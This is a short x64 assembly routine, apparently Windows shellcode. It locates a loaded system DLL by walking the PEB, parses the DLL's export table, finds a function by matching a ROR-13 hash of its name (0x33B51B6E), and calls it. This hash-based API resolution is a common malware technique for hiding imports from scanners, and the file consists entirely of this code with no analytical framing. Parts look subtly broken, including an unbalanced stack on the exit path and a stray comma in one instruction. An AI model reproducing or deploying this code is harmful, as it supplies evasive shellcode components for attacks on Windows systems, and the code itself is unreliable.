section .text
    global _chIt

_chIt:

    mov rdx, [gs:60h] ; PEB
    mov rdx, [rdx + 18h] ; LDR
    mov rdx, [rdx + 20h] ; InMemoryOrderModuleList
    mov rdx, [rdx] ; go to next module
    mov rdx, [rdx] ; go to next module
    mov rsi, [rdx - 8h + 58h] ; BaseDllName.Buffer
    movzx rcx, word [rdx + 48h] ; BaseDllName.Length
    mov rdi, 0x33B51B6E
    
    mov rdx, qword [rdx + 0x20] ; image base
    mov eax, dword [rdx + 0x3c] ; e_lfanew => PE offset
    add rax, rdx   ; rax += image base
    cmp word [rax + 0x18], 0x20b ; check if 64bit
    jne exit
    
    mov eax, dword [rax + 0x88] ; eax = IMAGE_DIRECTORY_ENTRY_EXPORT ( Virtual Address )
    test rax, rax ; if EXPORT VA == 0 exit
    je exit
    add rax, rdx ; rax += image base ( Exports location in memory )
    push rax
    mov ecx, dword [rax + 0x18] ; ecx = Get NumberOfNamePointer frim IMAGE_EXPORT_DIRECTORT struct
    mov r8d, dword [rax + 0x20] ; get Name Pointer RVA -> Address of the export name pointer table
    add r8, rdx ; r8 += image base
next_func:
    jrcxz exit  ; jump to exit if ecx == 0
    dec rcx
    mov esi, dword [r8 + rcx * 4] ; get "last function" from remaining ones
    add rsi, rdx ; add image base to function address
    xor r9, r9
next_byte:
    xor rax, rax
    lodsb
    ror r9d, 0xd
    add r9, rax
    cmp al, ah; check if we reach the end
    jne next_byte
    cmp r9, rdi,
    jne next_func
    pop rax
    mov r8d, dword [rax + 0x24] ; Get Ordinal table RVA from IMAGE_EXPORT_DIRECTORY
    add r8, rdx
    mov cx, word [r8 + rcx * 2]
    mov r8d, dword [rax + 0x1C]
    add r8, rdx
    mov eax, dword [r8 + rcx*4]
    add rax, rdx
    mov rdx, rax
    call rdx
    

exit:
    ret
    
